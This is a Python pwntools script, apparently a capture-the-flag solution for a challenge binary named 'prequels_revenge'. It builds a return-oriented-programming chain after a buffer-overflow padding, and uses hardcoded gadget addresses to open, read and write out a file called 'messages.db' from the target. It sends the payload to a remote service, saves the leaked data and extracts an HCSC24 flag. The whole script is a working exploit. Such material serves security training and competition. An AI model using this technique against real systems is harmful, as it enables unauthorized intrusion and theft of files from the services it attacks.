from pwn import *
from struct import pack
import re

# ROPgadget --binary ./out/prequels_revenge | grep "pop rdx ; pop rbx ; ret"

# Padding
p = b'a'*(64+8)

POP_RSI_RET =         0x0000000000401e54
POP_RDI_RET =         0x0000000000401e52
XOR_RAX_RAX_RET =     0x000000000052cca0
POP_RAX_RET =         0x00000000004c6d15
SYSCALL =             0x000000000053D785
POP_RDX_POP_RBX_RET = 0x000000000051400e
DATA_SECTION =        0x000000000063a140

MESSAGESDB =          0x00000000005A007F

CONST_0 =             0x0000000000000000
CONST_1 =             0x0000000000000001
CONST_2 =             0x0000000000000002
CONST_3 =             0x0000000000000003
CONST_LARGE =         0x0000000000003000

# 1/ open file
# open(pathname, flags)
# rax = 0x02, rdi = filename, rsi = flags
p += pack('<Q', POP_RSI_RET)
p += pack('<Q', CONST_0) # rsi = 0
p += pack('<Q', POP_RDI_RET)
p += pack('<Q', MESSAGESDB) # rdi = "messages.db"
p += pack('<Q', XOR_RAX_RAX_RET)
p += pack('<Q', POP_RAX_RET)
p += pack('<Q', CONST_2) # rax = 2
p += pack('<Q', SYSCALL) # syscall

# 2/ read(fd, addr, count)
# rax = 0x00, rdi = fd, rsi = writeable_buffer, rdx = count
p += pack('<Q', POP_RDX_POP_RBX_RET)
p += pack('<Q', CONST_LARGE) # rdx = 0x3000
p += pack('<Q', CONST_0)
p += pack('<Q', POP_RSI_RET)
p += pack('<Q', DATA_SECTION) # rsi = @ .data
p += pack('<Q', POP_RDI_RET)
p += pack('<Q', CONST_3) # rdi = 3 (our file descriptor will be most likely 3)
p += pack('<Q', POP_RAX_RET)
p += pack('<Q', CONST_0) # rax = 0
p += pack('<Q', SYSCALL)

# 3/ write(fd, addr, count) to STDOUT
# rax = 0x01, rdi = fd, rsi = writeable_buffer, rdx = count
p += pack('<Q', POP_RDX_POP_RBX_RET) # pop rdx ; pop rbx ; ret
p += pack('<Q', CONST_LARGE) # rdx = 0x3000
p += pack('<Q', CONST_0)
p += pack('<Q', POP_RSI_RET)
p += pack('<Q', DATA_SECTION) # rsi = @ .data
p += pack('<Q', POP_RDI_RET)
p += pack('<Q', CONST_1) # rdi = 1
p += pack('<Q', XOR_RAX_RAX_RET)
p += pack('<Q', POP_RAX_RET)
p += pack('<Q', CONST_1) # rax = 1
p += pack('<Q', SYSCALL)

c = remote('10.10.6.12', 10990)

c.sendlineafter('Enter your name: \n', p)
c.recvuntil('Fetching your message...\n')
dump = c.recvuntil('Segmentation fault')
open('messages.db', 'wb').write(dump)
m = re.search(b'HCSC24{.*}',dump)
if m is not None:
    print(m.group().decode())
